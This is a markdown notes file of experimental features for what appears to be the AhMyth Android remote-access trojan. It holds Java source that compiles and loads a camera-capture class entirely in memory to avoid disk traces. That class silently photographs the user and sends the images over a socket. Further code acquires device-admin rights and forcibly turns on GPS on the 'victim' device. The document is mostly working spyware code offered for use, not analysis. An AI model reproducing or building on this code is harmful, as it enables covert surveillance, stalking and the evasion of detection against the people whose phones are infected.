# <div align="center">Experminetal Features</div>

A file used to store code for experimental client and server features that could be released with future releases if they prove successful.

<br>

<details>
  <summary>Experimental Client Features</summary>

#
## <div align="center">Dynamic "In-Memory at Runtime" Camera Class Generation & Loading</div>

<div align="center">An experimental feature inspired by the Android equivalent of Metasploit Framework's Meterpreter Payload.</div>
<br>

<details>
  <summary>Code</summary>
<br>

- ClassGen.java
> Responsible for Generating and Loading the "CameraManager.java" Class at runtime completely in-memory.
```java
package ahmyth.mine.king.ahmyth;

import com.android.tools.r8.D8;
import com.android.tools.r8.D8Command;
import com.android.tools.r8.OutputMode;
import com.android.tools.r8.origin.Origin;
import com.android.tools.r8.dex.DexIndexedConsumer;
import javax.tools.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URI;
import java.nio.ByteBuffer;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;
import dalvik.system.InMemoryDexClassLoader;

public class InMemoryClassGen {
    public static void main(String[] args) throws Exception {
        String qualifiedName = "ahmyth.mine.king.ahmyth.CameraManager";
        String source = CamTemp.CAMERA_SOURCE_CODE;

        // 1. Compile Java source in-memory
        Map<String, byte[]> classBytes = compileInMemory(qualifiedName, source);

        // 2. Dex the compiled class bytes in-memory
        byte[] dexBytes = dexInMemory(classBytes);

        // 3. Load and execute
        loadAndRun(qualifiedName, dexBytes);
    }

    private static Map<String, byte[]> compileInMemory(String className, String sourceCode) throws IOException {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        DiagnosticCollector<JavaFileObject> diagnostics = new DiagnosticCollector<>();
        StandardJavaFileManager stdManager = compiler.getStandardFileManager(diagnostics, null, null);
        InMemoryJavaFileManager inMemManager = new InMemoryJavaFileManager(stdManager);

        JavaFileObject srcObj = new StringJavaFileObject(className, sourceCode);
        JavaCompiler.CompilationTask task = compiler.getTask(
                null, inMemManager, diagnostics, null, null, Collections.singletonList(srcObj)
        );
        if (!task.call()) {
            diagnostics.getDiagnostics().forEach(d -> System.err.println(d));
            throw new RuntimeException("Compilation failed");
        }
        return inMemManager.getAllClassBytes();
    }

    private static byte[] dexInMemory(Map<String, byte[]> classBytes) throws IOException {
        ByteArrayOutputStream dexOut = new ByteArrayOutputStream();
        D8Command command = D8Command.builder()
                .setOutput(dexOut::write, OutputMode.DexIndexed)
                .addClassProgramData(classBytes.get("ahmyth/mine/king/ahmyth/CameraManager"), Origin.unknown())
                .build();
        D8.run(command);
        return dexOut.toByteArray();
    }

    private static void loadAndRun(String className, byte[] dexBytes) throws Exception {
        ByteBuffer dexBuffer = ByteBuffer.wrap(dexBytes);
        ClassLoader parent = InMemoryClassGen.class.getClassLoader();
        InMemoryDexClassLoader loader = new InMemoryDexClassLoader(dexBuffer, parent);

        Class<?> cls = loader.loadClass(className);
        Object instance = cls.getDeclaredConstructor().newInstance();
        // Example: call a method named "initialize" if present
        try {
            cls.getMethod("initialize").invoke(instance);
        } catch (NoSuchMethodException ignored) {
            // no init method
        }
        System.out.println("Loaded and ran " + className);
    }

    // ---------- In-memory JavaFileObject ----------
    static class StringJavaFileObject extends SimpleJavaFileObject {
        private final String code;
        StringJavaFileObject(String className, String code) {
            super(URI.create("string:///" + className.replace('.', '/') + Kind.SOURCE.extension), Kind.SOURCE);
            this.code = code;
        }
        @Override public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            return code;
        }
    }

    // ---------- In-memory File Manager ----------
    static class InMemoryJavaFileManager extends ForwardingJavaFileManager<StandardJavaFileManager> {
        private final Map<String, ByteArrayOutputStream> buffers = new HashMap<>();

        InMemoryJavaFileManager(StandardJavaFileManager sjfm) {
            super(sjfm);
        }

        @Override
        public JavaFileObject getJavaFileForOutput(Location location, String className, JavaFileObject.Kind kind, FileObject sibling) {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            buffers.put(className, baos);
            return new SimpleJavaFileObject(
                    URI.create("mem://" + className.replace('.', '/') + kind.extension), kind) {
                @Override
                public OutputStream openOutputStream() {
                    return baos;
                }
            };
        }

        Map<String, byte[]> getAllClassBytes() {
            Map<String, byte[]> result = new HashMap<>();
            buffers.forEach((name, baos) -> result.put(name.replace('.', '/'), baos.toByteArray()));
            return result;
        }
    }
}
```
<br>

- CamTemp.java
> "CameraManger" Template file required for class file generation.
```java
package ahmyth.mine.king.ahmyth;

public class CamTemp {
    public static final String CAMERA_SOURCE_CODE =
            "package ahmyth.mine.king.ahmyth;\n" +
            "import android.content.Context;\n" +
            "import android.content.pm.PackageManager;\n" +
            "import android.graphics.Bitmap;\n" +
            "import android.graphics.BitmapFactory;\n" +
            "import android.graphics.SurfaceTexture;\n" +
            "import android.hardware.Camera;\n" +
            "import android.hardware.Camera.PictureCallback;\n" +
            "import android.hardware.Camera.Parameters;\n" +
            "import org.json.JSONArray;\n" +
            "import org.json.JSONException;\n" +
            "import org.json.JSONObject;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "public class CameraManager {\n" +
            "    private Context context;\n" +
            "    private Camera camera;\n" +
            "    public CameraManager(Context context) {\n" +
            "        this.context = context;\n" +
            "    }\n" +
            "    public void startUp(int cameraID) {\n" +
            "        camera = Camera.open(cameraID);\n" +
            "        Parameters parameters = camera.getParameters();\n" +
            "        camera.setParameters(parameters);\n" +
            "        try {\n" +
            "            camera.setPreviewTexture(new SurfaceTexture(0));\n" +
            "            camera.startPreview();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        camera.takePicture(null, null, new PictureCallback() {\n" +
            "            @Override\n" +
            "            public void onPictureTaken(byte[] data, Camera camera) {\n" +
            "                releaseCamera();\n" +
            "                sendPhoto(data);\n" +
            "            }\n" +
            "        });\n" +
            "    }\n" +
            "    private void sendPhoto(byte[] data) {\n" +
            "        try {\n" +
            "            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);\n" +
            "            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n" +
            "            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos);\n" +
            "            JSONObject object = new JSONObject();\n" +
            "            object.put(\"image\", true);\n" +
            "            object.put(\"buffer\", bos.toByteArray());\n" +
            "            IOSocket.getInstance().getIoSocket().emit(\"x0000ca\", object);\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "    private void releaseCamera() {\n" +
            "        if (camera != null) {\n" +
            "            camera.stopPreview();\n" +
            "            camera.release();\n" +
            "            camera = null;\n" +
            "        }\n" +
            "    }\n" +
            "    public JSONObject findCameraList() {\n" +
            "        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {\n" +
            "            return null;\n" +
            "        }\n" +
            "        try {\n" +
            "            JSONObject cameras = new JSONObject();\n" +
            "            JSONArray list = new JSONArray();\n" +
            "            cameras.put(\"camList\", true);\n" +
            "            int numberOfCameras = Camera.getNumberOfCameras();\n" +
            "            for (int i = 0; i < numberOfCameras; i++) {\n" +
            "                Camera.CameraInfo info = new Camera.CameraInfo();\n" +
            "                Camera.getCameraInfo(i, info);\n" +
            "                JSONObject jo = new JSONObject();\n" +
            "                jo.put(\"id\", i);\n" +
            "                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {\n" +
            "                    jo.put(\"name\", \"Front\");\n" +
            "                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {\n" +
            "                    jo.put(\"name\", \"Back\");\n" +
            "                } else {\n" +
            "                    jo.put(\"name\", \"Other\");\n" +
            "                }\n" +
            "                list.put(jo);\n" +
            "            }\n" +
            "            cameras.put(\"list\", list);\n" +
            "            return cameras;\n" +
            "        } catch (JSONException e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "        return null;\n" +
            "    }\n" +
            "}\n" +
            "}";
}
```

</details>

<details>
  <summary>Explanation</summary>
  <br>

The provided code in the dropdown tab below this one, performs all of the following operations listed below, dynamically in memory, meaning that nothing gets written to disk (aka the Android fileSystem)

## <div align="center"><ins>Compilation Phase</ins></div>
1. **In memory:** Wraps your `CamTemp.CAMERA_SOURCE_CODE` string in a custom `StringJavaFileObject` (extends `SimpleJavaFileObject`).
2. **In memory:** Uses a `ForwardingJavaFileManager<StandardJavaFileManager>` (here: `InMemoryJavaFileManager`) that intercepts compiler output and captures `.class` bytes into a `Map<String, byte[]>`.
3. **In memory:** Invokes the Java Compiler API (`ToolProvider.getSystemJavaCompiler()`) with the above file manager and source object to produce byte arrays for each compiled class—no disk I/O.

## <div align="center"><ins>DEX Generation Phase</ins></div>
4. **In memory:** Feeds the raw `.class` byte array for `ahmyth.mine.king.ahmyth.CameraManager` into the D8 programmatic API (`com.android.tools.r8.D8Command`).
5. **In memory:** Uses a `DexIndexedConsumer` backed by a `ByteArrayOutputStream` to collect the resulting `.dex` file bytes directly into RAM—still no disk writes.

## <div align="center"><ins>Loading & Execution Phase</ins></div>
6. **In memory:** Wraps the generated DEX byte array in a `ByteBuffer`.
7. **In memory:** Instantiates Android’s `InMemoryDexClassLoader` (API 26+) with that `ByteBuffer` and the app’s existing classloader as parent.
8. **In memory:** Loads `ahmyth.mine.king.ahmyth.CameraManager` by name and reflectively calls its no-arg constructor (and optionally any `initialize()` or other methods).
9. **In memory:** Reports success to `System.out` once the class is loaded and methods have run.

---

_All major steps—source → `.class` → `.dex` → loaded `Class<?>`—all happen in RAM. The only “filesystem” artifacts are wholly represented by in-memory file objects and byte buffers, so nothing ever touches persistent storage._

  <br>
</details>
<br>

## <div align="center">Device Admin Privileges</div>

This will hopefully give the AhMyth Payload Administrator Privileges for future features.

<details>
  <summary>Code</summary>
  <br>

- DeviceAdmin.java
```java
package ahmyth.mine.king.ahmyth;

import android.app.admin.DeviceAdminReceiver;

import android.app.admin.DevicePolicyManager;

import android.content.ComponentName;

import android.content.Context;

public class DeviceAdmin extends DeviceAdminReceiver {

    static DevicePolicyManager getDPM(Context context) {

        return (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE);

    }

    public static ComponentName getComponentName(Context context) {

        return new ComponentName(context.getApplicationContext(), DeviceAdmin.class);

    }

}
```
</details>
<br>
  
## <div align="center">Automatically Enable Victim GPS</div>

This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.

<details>
  <summary>Code</summary>
  <br>
  
- LocationManager.java
```java
    private void activateGps(Context context) {

        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);

        if (!prefs.getBoolean("allow_location_modechange", false))

            return;

        if (!DeviceAdmin.getDPM(context).isAdminActive(DeviceAdmin.getComponentName(context)))

            return;

        if (!DeviceAdmin.getDPM(context).isDeviceOwnerApp(context.getApplicationContext().getPackageName()))

            return;

        DeviceAdmin.getDPM(context).setSecureSetting(

                DeviceAdmin.getComponentName(context),

                Settings.Secure.LOCATION_MODE,

                Integer.toString(Settings.Secure.LOCATION_MODE_HIGH_ACCURACY)

        );

        Log.d("Done", "Forcefully enabled GPS");

    }

    private void getLocation(Context context) throws SecurityException {

        activateGps(context);

        LocationManager locationManager = (LocationManager) context.getApplicationContext().getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, null);

    }
```
<br>

- Settings.java
```java
        perms.put("allow_location", new String[]{

                Manifest.permission.ACCESS_FINE_LOCATION,

        });

        perms.put("allow_location_modechange", new String[]{

                Manifest.permission.BIND_DEVICE_ADMIN,

        });
```

</details>
<br>

</details>

#

<details>
  <summary>Experminetal Server Features</summary>

### Nothing to show.

</details>
